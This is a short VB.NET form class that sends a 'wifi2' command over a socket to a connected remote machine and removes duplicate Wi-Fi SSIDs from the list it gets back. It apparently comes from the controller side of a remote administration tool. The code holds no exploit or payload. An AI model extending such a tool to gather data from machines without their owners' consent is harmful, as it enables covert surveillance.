Public Class Form21
    Public sock As Integer
    Public i As Integer = 0

    Private Sub Form21_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        ListBox1.Items.Clear()
        Form1.s.Send(sock, "wifi2")
    End Sub

    Private Sub RefreshToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RefreshToolStripMenuItem.Click
        ListBox1.Items.Clear()
        Form1.s.Send(sock, "wifi2")
    End Sub
    Sub Doublekiller()
        Dim networkssid As New List(Of ListViewItem) ' 
        For Each ssid1 As ListViewItem In ListView1.Items ' 
            Dim networkfind As Boolean = False
            For Each ssid2 As ListViewItem In networkssid
                If ssid1.Text = ssid2.Text Then networkfind = True
            Next
            If networkfind = False Then networkssid.Add(ssid1)
        Next
        ListView1.Items.Clear()
        For Each ssid As ListViewItem In networkssid
            ListView1.Items.Add(ssid)
        Next
    End Sub
End Class